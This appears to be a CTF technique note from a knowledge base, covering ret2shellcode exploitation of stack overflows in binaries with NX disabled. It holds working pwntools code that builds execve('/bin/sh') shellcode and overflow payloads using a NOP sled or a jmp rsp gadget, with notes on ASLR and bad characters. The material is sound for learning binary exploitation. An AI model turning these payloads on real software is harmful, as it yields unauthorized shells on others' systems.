---
id: ret2shellcode-nx-disabled
category: PWN
tags: [shellcode, ret2shellcode, nx-disabled, executable-stack, rwx, jmp-rsp, jmp-esp, shellcraft, asm, ret2reg]
tools: [pwntools]
manuals: ["Manuals/pwntools/3. Contexto para Claude.md"]
title: "ret2shellcode: inject shellcode with NX disabled"
difficulty: medium
created: 2026-10-04
updated: 2026-10-04
related: [stack-bof-ret2win-ret2libc]
---

## How to recognize this pattern

- `checksec` shows **`NX disabled`** / an executable stack (RWX). Without that, shellcode on the
  stack won't run → it's ROP/ret2libc, not this.
- A stack overflow (like in `stack-bof-ret2win-ret2libc`) **plus** a buffer large enough to hold the
  shellcode, and some way to know/jump to its address.

## Method

### 1. Confirm the surface
```bash
checksec ./chall            # look for "NX: No" / "RWX"
```

### 2. Generate the shellcode
```python
from pwn import *
context.binary = "./chall"          # sets arch/os/endian automatically
sc = asm(shellcraft.sh())           # execve("/bin/sh") for the binary's arch
```

### 3. Deliver + redirect execution to the shellcode
```python
# Case A: you know/leak the buffer's address (no PIE, or a leak):
payload = sc.ljust(OFFSET, b"\x90") + p64(BUF_ADDR)   # returns to the start of the buffer
# Case B: NOP sled + jmp rsp (when the buffer sits right where RSP points at the ret):
jmp_rsp = next(ELF("./chall").search(asm("jmp rsp")))
payload = b"\x90"*OFFSET + p64(jmp_rsp) + sc
p = process("./chall"); p.sendline(payload); p.interactive()
```

## Gotchas

- **Stack ASLR:** with no leak and PIE/ASLR on, the buffer address varies → you need a
  `jmp rsp`/`jmp esp` (a gadget at a fixed address) or a leak first. `No PIE` + ASLR still randomizes
  the stack, so a fixed buffer address only works if the leak confirms it.
- **NOP sled** gives slack so the return address doesn't have to be exact (useful with weak ASLR).
- **Bad chars:** if the input goes through `scanf("%s")`/`gets`, bytes `\x00 \x09 \x0a \x20`
  cut/terminate it; generate shellcode without them (encoded `shellcraft`) or change the read vector.
- The shellcode has to match the **arch** (32 vs 64): `context.binary` keeps you from assembling x86
  for an x64 target.
- If `checksec` shows NX **enabled**, stop: this vector doesn't apply, go to ROP/ret2libc.

## Cross-reference

- `Manuals/pwntools/3. Contexto para Claude.md`: `asm`, `shellcraft`, `context`.
- `stack-bof-ret2win-ret2libc`: same overflow, but when NX is on (ROP instead of shellcode).
